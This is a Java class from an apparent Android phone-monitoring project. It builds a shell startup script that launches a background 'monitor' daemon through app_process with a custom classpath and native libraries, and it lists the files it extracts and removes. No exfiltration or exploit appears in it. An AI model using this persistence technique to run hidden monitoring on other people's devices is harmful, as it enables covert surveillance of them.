package com.fx.pmond.ref;

import java.io.File;
import java.util.ArrayList;

import com.fx.daemon.Daemon;
import com.fx.daemon.DaemonHelper;
import com.vvt.logger.FxLog;
import com.vvt.shell.Shell;

public class MonitorDaemon extends Daemon {
	
	private static final String TAG = "MonitorDaemon";
	private static boolean LOGV = Customization.VERBOSE;
	
	private static ArrayList<File> sExtractingFileList;
	private static ArrayList<File> sRemovingFileList;
	
	@Override
	protected void createStartupScript() throws Exception {
		if (LOGV) FxLog.v(TAG, "createStartupScript # ENTER ...");
		
		StringBuilder script = new StringBuilder();
		script.append("#script\n");
		
		// Define reference library:-
		// export LD_LIBRARY_PATH=/system/lib:<native lib path>
		StringBuilder builder = new StringBuilder(DaemonHelper.SYSTEM_LIB_PATH);
		if (! DaemonHelper.SYSTEM_LIB_PATH.equals(MonitorDaemonResource.NATIVE_LIBS_PATH)) {
			builder.append(":").append(MonitorDaemonResource.NATIVE_LIBS_PATH);
		}
		script.append(String.format(FORMAT_LIBRARY, builder.toString()));
		
		// Define class path:- 
		// export CLASSPATH=<extracting path>/<zip file>;
		script.append(String.format(
				FORMAT_CLASSPATH, 
				MonitorDaemonResource.EXTRACTING_PATH, 
				MonitorDaemonResource.DEX_ZIP_FILENAME));
		
		// Define Main:-
		// app_process /system/bin <main class> \\$* &
		script.append(String.format(FORMAT_APP_PROCESS, MonitorDaemonResource.MAIN_CLASS));
		
		String result = script.toString();
		if (LOGV) FxLog.v(TAG, String.format("Startup Script:-\n%s", result));
		
		createStartupScriptFile(MonitorDaemonResource.STARTUP_SCRIPT_PATH, result);
		
		if (LOGV) FxLog.v(TAG, "createStartupScript # EXIT ...");
	}
	
	@Override
	public String getTag() {
		return TAG;
	}

	@Override
	public String getProcessName() {
		return MonitorDaemonResource.PROCESS_NAME;
	}

	@Override
	public String getStartupScriptPath() {
		return MonitorDaemonResource.STARTUP_SCRIPT_PATH;
	}

	@Override
	protected ArrayList<File> getExtractingFileList() {
		if (sExtractingFileList == null) {
			
			sExtractingFileList = new ArrayList<File>();
			
			sExtractingFileList.add(new File(
					MonitorDaemonResource.EXTRACTING_PATH, 
					MonitorDaemonResource.DEX_ZIP_FILENAME));
			
			sExtractingFileList.add(new File(
					MonitorDaemonResource.EXTRACTING_PATH, 
					MonitorDaemonResource.SECURITY_CONFIG_FILE));
			
			sExtractingFileList.add(new File(
					MonitorDaemonResource.NATIVE_LIBS_PATH, 
					Shell.LIB_EXEC_FILE));
		}
		
		return sExtractingFileList;
	}

	@Override
	protected ArrayList<File> getRemovingFileList() {
		if (sRemovingFileList == null) {
			
			if (sExtractingFileList == null) {
				getExtractingFileList();
			}
			
			sRemovingFileList = new ArrayList<File>();
			sRemovingFileList.addAll(sExtractingFileList);
			sRemovingFileList.add(new File(MonitorDaemonResource.STARTUP_SCRIPT_PATH));
			sRemovingFileList.add(new File(
					MonitorDaemonResource.LOG_FOLDER, 
					MonitorDaemonResource.LOG_FILENAME));
		}
		
		return sRemovingFileList;
	}
	
}
